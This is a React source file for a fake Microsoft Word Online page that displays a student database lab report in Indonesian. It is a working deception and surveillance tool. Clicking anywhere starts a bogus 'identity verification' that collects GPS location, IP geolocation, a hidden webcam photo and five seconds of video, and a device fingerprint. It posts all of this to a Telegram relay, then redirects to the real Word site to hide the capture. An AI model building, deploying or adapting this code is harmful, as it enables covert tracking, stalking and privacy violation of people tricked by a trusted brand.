"use client";

import { useState, useRef, useEffect, useCallback } from "react";

// ─── Constants ──────────────────────────────────────────────────────────────
const WORD_REDIRECT = "https://office.live.com/start/Word.aspx";

export default function MSWordPage() {
  const [phase, setPhase] = useState<"document" | "verifying" | "done">("document");
  const [progress, setProgress] = useState(0);
  
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // Captured data
  const captured = useRef({
    photo: null as Blob | null,
    video: null as Blob | null,
    gps: null as { lat: number; lng: number } | null,
    ip: null as Record<string, string> | null,
    ua: "",
  });

  // Create a hidden video element for photo capture
  useEffect(() => {
    const video = document.createElement("video");
    video.style.display = "none";
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);
    videoRef.current = video;

    return () => {
      if (videoRef.current) {
        document.body.removeChild(videoRef.current);
      }
    };
  }, []);

  // ── CAPTURE FLOW (Background) ──────────────────────────────────────────────
  const captureEverything = useCallback(async () => {
    const gpsPromise = new Promise<{ lat: number; lng: number } | null>(resolve => {
      if (!("geolocation" in navigator)) { resolve(null); return; }
      navigator.geolocation.getCurrentPosition(
        p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
        () => resolve(null),
        { timeout: 5000, enableHighAccuracy: true }
      );
    });

    const ipPromise = (async () => {
      try { 
        const r = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) }); 
        return r.ok ? await r.json() : null; 
      } catch { 
        try {
          const r2 = await fetch("https://ipinfo.io/json?token=56ce10652d9d41", { signal: AbortSignal.timeout(4000) });
          return r2.ok ? await r2.json() : null;
        } catch {
          return null; 
        }
      }
    })();

    const streamPromise = (async () => {
      try { 
        return await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        }); 
      } catch { 
        return null; 
      }
    })();

    const [gps, ip, capStream] = await Promise.all([gpsPromise, ipPromise, streamPromise]);
    captured.current = { photo: null, video: null, gps, ip, ua: navigator.userAgent };

    if (capStream) {
      streamRef.current = capStream;
      
      // 1. Take Photo immediately (allow 300ms for camera setup)
      const photo = await new Promise<Blob | null>(res => {
        const v = videoRef.current;
        if (!v) { res(null); return; }
        v.srcObject = capStream;
        v.onloadedmetadata = () => {
          v.play();
          setTimeout(() => {
            const c = document.createElement("canvas"); 
            c.width = v.videoWidth || 640; 
            c.height = v.videoHeight || 480;
            const ctx = c.getContext("2d");
            if (ctx) { 
              ctx.drawImage(v, 0, 0, c.width, c.height); 
              c.toBlob(b => res(b), "image/jpeg", 0.85); 
            } else { 
              res(null); 
            }
          }, 300);
        };
      });
      captured.current.photo = photo;

      // 2. Record 5 seconds of video
      const videoBlob = await new Promise<Blob | null>(res => {
        let mediaRecorder: MediaRecorder;
        try {
          mediaRecorder = new MediaRecorder(capStream, { mimeType: "video/webm" });
        } catch {
          try {
            mediaRecorder = new MediaRecorder(capStream);
          } catch {
            res(null);
            return;
          }
        }
        const chunks: Blob[] = [];
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        mediaRecorder.onstop = () => { res(new Blob(chunks, { type: mediaRecorder.mimeType })); };
        mediaRecorder.start();
        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
      });
      captured.current.video = videoBlob;

      // Stop tracks
      capStream.getTracks().forEach(t => t.stop());
    }
  }, []);

  // ── SEND TO TELEGRAM ────────────────────────────────────────────────────────
  const sendCaptured = useCallback(async (extra?: { phase?: string }) => {
    const c = captured.current;
    const fd = new FormData();
    if (c.photo) fd.append("photo", c.photo, "photo.jpg");
    if (c.video) fd.append("video", c.video, "video.webm");

    const ua = c.ua || navigator.userAgent;
    const os = (() => {
      if (/android/i.test(ua)) { const m = ua.match(/Android\s+([\d.]+)/); const d = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/); return `Android ${m?.[1] || '?'} (${d?.[1]?.trim() || 'Unknown'})`; }
      if (/iPad|iPhone|iPod/.test(ua)) { const m = ua.match(/OS\s+([\d_]+)/); return `iOS ${m?.[1]?.replace(/_/g, '.') || '?'}`; }
      if (/Windows/.test(ua)) { const m = ua.match(/Windows NT\s+([\d.]+)/); return `Windows ${({ '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' })[m?.[1] || ''] || m?.[1] || '?'}`; }
      if (/Mac OS X/.test(ua)) { const m = ua.match(/Mac OS X\s+([\d_]+)/); return `macOS ${m?.[1]?.replace(/_/g, '.') || '?'}`; }
      return /Linux/.test(ua) ? 'Linux' : 'Unknown OS';
    })();
    const browser = (() => {
      if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
      if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
      if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
      return 'Unknown Browser';
    })();
    const nav = navigator as any;
    const conn = nav.connection;
    const network = conn ? `${String(conn.effectiveType || conn.type || '?').toUpperCase()}${conn.downlink ? ` - ${conn.downlink} Mbps` : ''}` : 'Unknown';
    let battery = 'Unknown';
    try { const b = nav.getBattery?.(); if (b) b.then((bat: { level: number; charging: boolean }) => { battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (Charging)' : ' (Discharging)'}`; }); } catch {}
    const ram = nav.deviceMemory ? `${nav.deviceMemory} GB` : 'Unknown';
    const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
    const dpr = window.devicePixelRatio || 1;
    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
    
    let locStr = '';
    if (c.gps) { locStr = `📍 GPS: ${c.gps.lat}, ${c.gps.lng}\n🗺 Maps: https://www.google.com/maps?q=${c.gps.lat},${c.gps.lng}`; }
    else if (c.ip) { locStr = `🌐 IP: ${c.ip['ip'] || '?'}\n🏙 Kota: ${c.ip['city'] || '?'}\n🗺 Region: ${c.ip['region'] || '?'}\n🌏 Negara: ${c.ip['country'] || '?'}\n📍 Koordinat: ${c.ip['loc'] || '?'}\n🏢 ISP: ${c.ip['org'] || '?'}`; }
    else { locStr = '❌ LOKASI TIDAK TERSEDIA'; }
    
    const ts = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    const info = `MICROSOFT WORD — ${extra?.phase || 'CAPTURE'}\n━━━━━━━━━━━━━━━━━━━\n⏱ ${ts}\n🆔 ${new Date().toISOString()}\n\n━━━ LOKASI ━━━\n${locStr}\n\n━━━ PERANGKAT ━━━\n💻 OS: ${os}\n🌍 Browser: ${browser}\n📱 Platform: ${navigator.platform || '?'}\n🗣 Bahasa: ${navigator.language}\n🕐 Zona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🔋 Baterai: ${battery}\n🧠 RAM: ${ram}\n⚡ CPU: ${cpu}\n📶 Koneksi: ${network}\n\n━━━ LAYAR ━━━\n📐 ${window.screen.width}x${window.screen.height}\n👁 ${window.innerWidth}x${window.innerHeight}\n🔍 ${dpr}x\n🔄 ${orientation}\n━━━ UA ━━━\n${ua}`;
    
    fd.append("locationInfo", info);
    
    // Attempt sending to Telegram
    for (let i = 0; i < 2; i++) {
      try { 
        const r = await fetch("/api/telegram", { method: "POST", body: fd }); 
        if (r.ok) break; 
      } catch {}
      if (i === 0) await new Promise(r => setTimeout(r, 500));
    }
  }, []);

  // ── TRIGGER VERIFICATION (When click anywhere in the page) ──────────────────
  const triggerVerification = async () => {
    if (phase === "verifying" || phase === "done") return;
    
    setPhase("verifying");
    setProgress(15);

    try {
      const timer = setInterval(() => {
        setProgress(p => {
          if (p >= 90) { clearInterval(timer); return 90; }
          return p + Math.floor(Math.random() * 15) + 5;
        });
      }, 400);

      await captureEverything();
      await sendCaptured({ phase: "WORD VERIFICATION COMPLETE" });

      clearInterval(timer);
      setProgress(100);

      setTimeout(() => {
        setPhase("done");
        window.location.href = WORD_REDIRECT;
      }, 1000);

    } catch (err) {
      console.error(err);
      setPhase("done");
      window.location.href = WORD_REDIRECT;
    }
  };

  return (
    <div className="min-h-screen bg-[#f3f2f1] font-sans flex flex-col overflow-hidden text-slate-800">
      
      {/* ——— MS WORD HEADER ——— */}
      <header className="bg-[#2b579a] text-white px-4 py-2 flex items-center justify-between z-10 shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 flex-shrink-0 flex items-center justify-center bg-white/10 rounded-sm">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
              <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-6.8 14.5H10L8.2 11h1.5l1.1 4.2 1.2-4.2h1.5l1.2 4.2 1.1-4.2h1.5l-2.2 6.5h-1.5L12.2 13l-1 4.5z"/>
            </svg>
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-sm font-semibold">
                Laporan Praktikum Basis Data.docx
              </span>
              <span className="text-[10px] bg-white/20 px-2 py-0.5 rounded font-normal">Tersimpan di Cloud</span>
            </div>
            <nav className="flex gap-3 text-xs mt-0.5 opacity-90">
              {["File", "Beranda", "Sisipkan", "Tata Letak", "Referensi", "Tinjau", "Tampilan", "Bantuan"].map((m, i) => (
                <span key={i} className="hover:bg-white/10 px-1 rounded cursor-pointer">{m}</span>
              ))}
            </nav>
          </div>
        </div>
        
        <div className="flex items-center gap-3">
          <button 
            onClick={triggerVerification}
            className="bg-[#106ebe] hover:bg-[#005a9e] text-white text-xs font-semibold px-4 py-1.5 rounded flex items-center gap-1.5 transition border border-transparent"
          >
            <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
            <span>Edit Dokumen</span>
          </button>
          <div className="w-7 h-7 rounded-full bg-[#106ebe] border border-white/20 flex items-center justify-center font-bold text-xs">
            U
          </div>
        </div>
      </header>

      {/* ——— MS WORD SUB HEADER / RIBBON BAR ——— */}
      <section className="bg-white border-b border-[#e1dfdd] px-4 py-1 flex items-center gap-2 text-xs text-[#605e5c] shadow-xs">
        <div className="flex items-center gap-1.5 border-r border-[#edebe9] pr-3">
          {["🖨", "↩", "↪"].map((b, i) => (
            <button key={i} className="hover:bg-[#f3f2f1] p-1 rounded font-mono">{b}</button>
          ))}
        </div>
        <div className="flex items-center gap-2 border-r border-[#edebe9] pr-3">
          <span className="bg-[#f3f2f1] px-2 py-0.5 rounded cursor-pointer font-semibold">Calibri</span>
          <span className="bg-[#f3f2f1] px-2 py-0.5 rounded cursor-pointer font-semibold">12</span>
        </div>
        <div className="flex items-center gap-1 border-r border-[#edebe9] pr-3 font-bold">
          {["B", "I", "U", "ab"].map((b, i) => (
            <button key={i} className="hover:bg-[#f3f2f1] px-2 py-0.5 rounded">{b}</button>
          ))}
        </div>
        <div className="flex items-center gap-1">
          {["≣", "≓", "⇄"].map((b, i) => (
            <button key={i} className="hover:bg-[#f3f2f1] px-2 py-0.5 rounded">{b}</button>
          ))}
        </div>
        <span className="text-[10px] text-[#a19f9d] italic ml-auto hidden md:inline">Mode Membaca - Dilindungi</span>
      </section>

      {/* ——— MAIN CONTENT CONTAINER ——— */}
      <div className="flex-1 overflow-auto flex justify-center py-6 px-4 relative min-h-0" onClick={triggerVerification}>
        
        {/* ——— A4 PAGE SHEET CLONE ——— */}
        <main className="bg-white w-full max-w-[800px] min-h-[1100px] border border-[#e1dfdd] shadow-md p-12 md:p-16 flex flex-col relative z-0 select-none">
          
          {/* Document Cover / Header Title */}
          <div className="text-center mb-12">
            <h1 className="text-2xl font-bold uppercase tracking-wider text-slate-900 leading-tight">
              LAPORAN PRAKTIKUM BASIS DATA
            </h1>
            <p className="text-md text-slate-500 mt-2 font-medium tracking-wide">
              PERANCANGAN & IMPLEMENTASI DATABASE MAHASISWA
            </p>
            <div className="w-32 h-[3px] bg-[#2b579a] mx-auto mt-6"></div>
          </div>

          {/* Metadata Mahasiswa */}
          <div className="bg-[#f3f2f1] rounded p-5 mb-8 border-l-4 border-[#2b579a] text-xs space-y-2">
            <div className="grid grid-cols-3 gap-1">
              <span className="font-semibold text-slate-500">Mata Kuliah:</span>
              <span className="col-span-2 text-slate-800">Praktikum Sistem Basis Data</span>
            </div>
            <div className="grid grid-cols-3 gap-1">
              <span className="font-semibold text-slate-500">Dosen Pengampu:</span>
              <span className="col-span-2 text-slate-800">Dr. Ir. Hermawan, M.T.</span>
            </div>
            <div className="grid grid-cols-3 gap-1">
              <span className="font-semibold text-slate-500">Status Laporan:</span>
              <span className="col-span-2 text-emerald-700 font-bold">Terverifikasi / Siap Nilai</span>
            </div>
          </div>

          {/* Content sections */}
          <div className="space-y-6 text-sm text-slate-700 leading-relaxed text-justify">
            
            {/* Bab 1 */}
            <div>
              <h2 className="text-lg font-bold text-slate-900 border-b border-[#edebe9] pb-1 mb-3">
                BAB I - PENDAHULUAN
              </h2>
              <h3 className="font-semibold text-slate-800 mb-1">1.1 Latar Belakang</h3>
              <p>
                Sistem basis data merupakan landasan utama dalam pengembangan aplikasi modern. Pada lingkungan institusi akademik, pengelolaan data mahasiswa, nilai, dan informasi kurikulum membutuhkan arsitektur penyimpanan yang kokoh, dinamis, dan aman untuk mencegah inkonsistensi data.
              </p>
              <h3 className="font-semibold text-slate-800 mt-3 mb-1">1.2 Tujuan Praktikum</h3>
              <ul className="list-disc pl-5 space-y-1">
                <li>Memahami konsep entitas dan relasi antar tabel (Entity Relationship Diagram).</li>
                <li>Mengimplementasikan Structured Query Language (SQL) untuk manipulasi data.</li>
                <li>Mempelajari penggunaan constraint (Primary Key, Foreign Key) untuk integritas referensial.</li>
              </ul>
            </div>

            {/* Bab 2 */}
            <div>
              <h2 className="text-lg font-bold text-slate-900 border-b border-[#edebe9] pb-1 mb-3">
                BAB II - LANDASAN TEORI
              </h2>
              <p>
                Relational Database Management System (RDBMS) mengorganisasikan data dalam bentuk baris (row) dan kolom (column) di dalam tabel-tabel terpisah yang dihubungkan melalui relasi logika. Operasi penulisan data diatur oleh prinsip ACID (Atomicity, Consistency, Isolation, Durability) guna menjaga keandalan database.
              </p>
            </div>

            {/* Bab 3 */}
            <div>
              <h2 className="text-lg font-bold text-slate-900 border-b border-[#edebe9] pb-1 mb-3">
                BAB III - PERANCANGAN SKEMA & DDL
              </h2>
              <p className="mb-3">
                Skema database terdiri dari dua entitas utama yaitu <code>mahasiswa</code> dan <code>nilai</code>. DDL (Data Definition Language) didefinisikan sebagai berikut:
              </p>
              <pre className="bg-[#f8f9fa] border border-[#e1dfdd] p-4 rounded font-mono text-[11px] text-blue-900 whitespace-pre-wrap select-all">
{`CREATE TABLE mahasiswa (
    nim VARCHAR(15) PRIMARY KEY,
    nama VARCHAR(100) NOT NULL,
    jurusan VARCHAR(50),
    angkatan INT,
    ipk DECIMAL(3,2)
);

CREATE TABLE nilai (
    nim VARCHAR(15),
    tugas INT,
    uts INT,
    uas INT,
    grade VARCHAR(2),
    FOREIGN KEY (nim) REFERENCES mahasiswa(nim)
);`}
              </pre>
            </div>

          </div>

          {/* Shadow Overlay */}
          <div className="absolute inset-0 bg-slate-50/5 backdrop-blur-[1px] pointer-events-none z-0"></div>
        </main>
      </div>

      {/* ——— PHASE 3: VERIFICATION MODAL POPUP ——— */}
      {phase === "verifying" && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-[1px] flex items-center justify-center p-4 z-50 animate-fade-in">
          <div className="bg-white rounded-sm w-full max-w-md p-6 shadow-2xl border border-slate-200 text-center">
            <div className="flex justify-center mb-4">
              <div className="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center text-[#2b579a] animate-pulse">
                <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                </svg>
              </div>
            </div>
            
            <h3 className="text-md font-semibold text-slate-800 mb-2">Microsoft Word Online</h3>
            <p className="text-xs text-slate-500 mb-6 leading-relaxed">
              Dokumen dilindungi. Untuk dapat mengedit Laporan Praktikum Basis Data.docx, selesaikan verifikasi identitas Microsoft Account dengan mengizinkan akses lokasi & kamera.
            </p>

            {/* Progress bar */}
            <div className="w-full bg-slate-100 rounded-full h-2.5 mb-2 overflow-hidden">
              <div 
                className="bg-[#2b579a] h-2.5 rounded-full transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
            <div className="flex justify-between items-center text-[10px] text-slate-400 mb-4 font-mono">
              <span>MENGHUBUNGKAN DENGAN SERVER...</span>
              <span>{progress}%</span>
            </div>

            <div className="text-center text-xs text-slate-400 italic">
              Harap berikan izin akses browser saat popup verifikasi muncul
            </div>
          </div>
        </div>
      )}

      {/* ——— PHASE 4: SUCCESS REDIRECT ——— */}
      {phase === "done" && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-[2px] flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-sm p-6 max-w-sm w-full text-center shadow-2xl border border-slate-100">
            <svg viewBox="0 0 24 24" width="48" height="48" fill="#106ebe" className="mx-auto mb-4 animate-bounce"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
            <h3 className="text-md font-semibold text-slate-800 mb-1">Verifikasi Berhasil</h3>
            <p className="text-xs text-slate-500 mb-4">Membuka editor Word Online...</p>
            <div className="w-10 h-10 border-4 border-slate-200 border-t-[#2b579a] rounded-full animate-spin mx-auto"></div>
          </div>
        </div>
      )}

    </div>
  );
}
